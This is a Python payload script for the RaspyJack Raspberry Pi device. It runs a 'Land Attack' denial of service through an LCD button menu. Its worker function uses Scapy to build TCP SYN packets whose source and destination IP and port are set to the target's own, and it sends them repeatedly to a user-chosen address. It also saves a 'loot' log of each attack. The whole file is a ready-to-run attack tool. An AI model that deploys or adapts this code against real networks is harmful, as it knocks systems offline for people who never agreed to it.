#!/usr/bin/env python3
"""
RaspyJack *payload* – **DoS: Land Attack**
========================================
This payload performs a Land Attack, a type of Denial of Service (DoS)
that primarily affects older, vulnerable systems. It sends specially
crafted packets where the source and destination IP addresses (and
optionally ports) are set to the target's own address. This can cause
the target system to crash or become unresponsive.

Features:
- Interactive UI for entering target IP address and port.
- Uses Scapy to craft and send Land Attack packets.
- Displays current status (ACTIVE/STOPPED) on the LCD.
- Graceful exit via KEY3 or Ctrl-C, ensuring the attack is stopped.
- Dynamically determines the active network interface.

Controls:
- MAIN SCREEN:
    - OK: Start Land Attack.
    - KEY1: Edit Target IP.
    - KEY2: Edit Target Port.
    - KEY3: Exit Payload.
- IP INPUT SCREEN:
    - UP/DOWN: Change digit at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm IP.
    - KEY3: Cancel IP input.
- PORT INPUT SCREEN:
    - UP/DOWN: Change digit at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm Port.
    - KEY3: Cancel Port input.
- ATTACKING SCREEN:
    - KEY3: Stop Attack and Exit.
"""

import sys
import os
import time
import signal
import subprocess
import threading

RASPYJACK_ROOT = '/root/Raspyjack' if os.path.isdir('/root/Raspyjack') else os.path.abspath(os.path.join(__file__, '..', '..'))
if RASPYJACK_ROOT not in sys.path:
    sys.path.insert(0, RASPYJACK_ROOT)
wifi_subdir = os.path.join(RASPYJACK_ROOT, 'wifi')
if os.path.isdir(wifi_subdir) and wifi_subdir not in sys.path:
    sys.path.insert(0, wifi_subdir)
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from wifi import raspyjack_integration as rji
from scapy.all import IP, TCP, send, conf
conf.verb = 0

TARGET_IP = "192.168.1.10"
TARGET_PORT = "80"

LOOT_DIR = os.path.join(RASPYJACK_ROOT, 'loot', 'dos_land_attack')
os.makedirs(LOOT_DIR, exist_ok=True)

PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

running = True
attack_thread = None
attack_stop_event = threading.Event() # Event to signal the attack thread to stop
current_ip_input = TARGET_IP
ip_input_cursor_pos = 0
current_port_input = TARGET_PORT
port_input_cursor_pos = 0
ATTACK_INTERFACE = None

def cleanup(*_):
    global running
    if running:
        running = False
        attack_stop_event.set()
        if attack_thread and attack_thread.is_alive():
            attack_thread.join(timeout=2)
        save_loot_snapshot()
        print("Land Attack cleanup complete.", file=sys.stderr)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def save_loot_snapshot():
    """Save a loot snapshot with attack stats."""
    try:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        loot_file = os.path.join(LOOT_DIR, f"land_attack_{timestamp}.txt")
        with open(loot_file, 'w') as f:
            f.write("Land Attack\n")
            f.write(f"Target IP: {TARGET_IP}\n")
            f.write(f"Target Port: {TARGET_PORT}\n")
            f.write(f"Interface: {ATTACK_INTERFACE}\n")
            f.write(f"Timestamp: {timestamp}\n")
        print(f"Loot saved to {loot_file}")
    except Exception as e:
        print(f"Error saving loot: {e}", file=sys.stderr)

def draw_ui(screen_state="main", message_lines=None):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "DoS: Land Attack", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    
    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (HEIGHT - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (WIDTH - w) // 2
            d.text((x, y_offset), line, font=FONT, fill="yellow")
            y_offset += 12
    elif screen_state == "main":
        d.text((5, 30), "Target IP:", font=FONT, fill="white")
        d.text((5, 45), TARGET_IP, font=FONT_TITLE, fill="yellow")
        d.text((5, 65), "Target Port:", font=FONT, fill="white")
        d.text((5, 80), TARGET_PORT, font=FONT_TITLE, fill="yellow")
        d.text((5, 100), "OK=Start | KEY1=Edit IP | KEY2=Edit Port", font=FONT, fill="cyan")
        d.text((5, 110), "KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "ip_input":
        d.text((5, 30), "Enter Target IP:", font=FONT, fill="white")
        display_ip = list(current_ip_input)
        if ip_input_cursor_pos < len(display_ip):
            display_ip[ip_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ip), font=FONT_TITLE, fill="yellow")
        d.text((5, 100), "UP/DOWN=Digit | LEFT/RIGHT=Move", font=FONT, fill="cyan")
        d.text((5, 110), "OK=Confirm | KEY3=Cancel", font=FONT, fill="cyan")
    elif screen_state == "port_input":
        d.text((5, 30), "Enter Target Port:", font=FONT, fill="white")
        display_port = list(current_port_input)
        if port_input_cursor_pos < len(display_port):
            display_port[port_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_port), font=FONT_TITLE, fill="yellow")
        d.text((5, 100), "UP/DOWN=Digit | LEFT/RIGHT=Move", font=FONT, fill="cyan")
        d.text((5, 110), "OK=Confirm | KEY3=Cancel", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        d.text((5, 40), "Land Attack ACTIVE", font=FONT_TITLE, fill="red")
        d.text((5, 60), f"Target: {TARGET_IP}", font=FONT, fill="white")
        d.text((5, 75), f"Port: {TARGET_PORT}", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Stop", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_ip_input_logic(initial_ip):
    global current_ip_input, ip_input_cursor_pos
    current_ip_input = initial_ip
    ip_input_cursor_pos = len(initial_ip) - 1
    
    draw_ui("ip_input")
    
    last_button_press_time = 0
    BUTTON_DEBOUNCE_TIME = 0.3 # seconds

    while running:
        current_time = time.time()
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                btn = name
                last_button_press_time = current_time
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            parts = current_ip_input.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return current_ip_input
            else:
                draw_ui(message_lines=["Invalid IP!", "Try again."])
                time.sleep(2)
                current_ip_input = initial_ip
                ip_input_cursor_pos = len(initial_ip) - 1
                draw_ui("ip_input")
        
        if btn == "LEFT":
            ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
            draw_ui("ip_input")
        elif btn == "RIGHT":
            ip_input_cursor_pos = min(len(current_ip_input), current_ip_input.find('.') if '.' in current_ip_input[ip_input_cursor_pos:] else len(current_ip_input), ip_input_cursor_pos + 1)
            draw_ui("ip_input")
        elif btn == "UP" or btn == "DOWN":
            if ip_input_cursor_pos < len(current_ip_input):
                char_list = list(current_ip_input)
                current_char = char_list[ip_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = (int(current_char) + 1) % 10 if btn == "UP" else (int(current_char) - 1 + 10) % 10
                    char_list[ip_input_cursor_pos] = str(digit)
                    current_ip_input = "".join(char_list)
                elif current_char == '.':
                    if btn == "UP":
                        ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                    else:
                        ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
                draw_ui("ip_input")
        
        time.sleep(0.05)
    return None

def handle_port_input_logic(initial_port):
    global current_port_input, port_input_cursor_pos
    current_port_input = initial_port
    port_input_cursor_pos = len(initial_port) - 1
    
    draw_ui("port_input")
    
    last_button_press_time = 0
    BUTTON_DEBOUNCE_TIME = 0.3 # seconds

    while running:
        current_time = time.time()
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                btn = name
                last_button_press_time = current_time
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            if current_port_input.isdigit() and 1 <= int(current_port_input) <= 65535:
                return current_port_input
            else:
                draw_ui(message_lines=["Invalid Port!", "Try again."])
                time.sleep(2)
                current_port_input = initial_port
                port_input_cursor_pos = len(initial_port) - 1
                draw_ui("port_input")
        
        if btn == "LEFT":
            port_input_cursor_pos = max(0, port_input_cursor_pos - 1)
            draw_ui("port_input")
        elif btn == "RIGHT":
            port_input_cursor_pos = min(len(current_port_input), port_input_cursor_pos + 1)
            draw_ui("port_input")
        elif btn == "UP" or btn == "DOWN":
            if port_input_cursor_pos < len(current_port_input):
                char_list = list(current_port_input)
                current_char = char_list[port_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = (int(current_char) + 1) % 10 if btn == "UP" else (int(current_char) - 1 + 10) % 10
                    char_list[port_input_cursor_pos] = str(digit)
                    current_port_input = "".join(char_list)
                draw_ui("port_input")
        
        time.sleep(0.05)
    return None

def land_attack_worker(target_ip, target_port, interface):
    global attack_stop_event
    land_packet = IP(src=target_ip, dst=target_ip)/TCP(sport=int(target_port), dport=int(target_port), flags="S")
    
    try:
        while not attack_stop_event.is_set():
            send(land_packet, iface=interface, verbose=0)
            time.sleep(0.01) # Send packets rapidly
    except Exception as e:
        print(f"[ERROR] Land Attack worker failed: {e}", file=sys.stderr)
        draw_ui(message_lines=[f"Attack failed!", f"{str(e)[:20]}"])
        attack_stop_event.set() # Stop the attack on error

def start_attack():
    global attack_thread, ATTACK_INTERFACE
    if attack_thread and attack_thread.is_alive():
        return False

    interface = rji.get_best_interface()
    if not interface:
        draw_ui(message_lines=["No active network", "interface found!"])
        time.sleep(3)
        return False
    ATTACK_INTERFACE = interface

    draw_ui(screen_state="attacking", message_lines=["Starting attack..."])
    attack_stop_event.clear()
    attack_thread = threading.Thread(target=land_attack_worker, args=(TARGET_IP, TARGET_PORT, ATTACK_INTERFACE), daemon=True)
    attack_thread.start()
    return True

def stop_attack():
    attack_stop_event.set()
    if attack_thread:
        attack_thread.join(timeout=2)

if __name__ == "__main__":
    try:
        # Check if Scapy is installed
        try:
            from scapy.all import IP
        except ImportError:
            draw_ui(message_lines=["Scapy not found!", "Install with:", "`pip install scapy`"])
            time.sleep(5)
            raise SystemExit("Scapy not found.")

        current_screen = "main"
        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.3 # seconds

        while running:
            current_time = time.time()
            
            if current_screen == "main":
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    if start_attack():
                        current_screen = "attacking"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                
                if GPIO.input(PINS["KEY1"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    current_ip_input = TARGET_IP
                    current_screen = "ip_input"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                
                if GPIO.input(PINS["KEY2"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    current_port_input = TARGET_PORT
                    current_screen = "port_input"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
            
            elif current_screen == "ip_input":
                new_ip = handle_ip_input_logic(current_ip_input)
                if new_ip:
                    TARGET_IP = new_ip
                current_screen = "main"
                time.sleep(BUTTON_DEBOUNCE_TIME)
            
            elif current_screen == "port_input":
                new_port = handle_port_input_logic(current_port_input)
                if new_port:
                    TARGET_PORT = new_port
                current_screen = "main"
                time.sleep(BUTTON_DEBOUNCE_TIME)
            
            elif current_screen == "attacking":
                draw_ui("attacking")
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    stop_attack()
                    cleanup()
                    break
                time.sleep(0.1)

            time.sleep(0.05)

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        draw_ui(message_lines=["An error occurred.", str(e)[:20]])
        time.sleep(3)
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Land Attack payload finished.")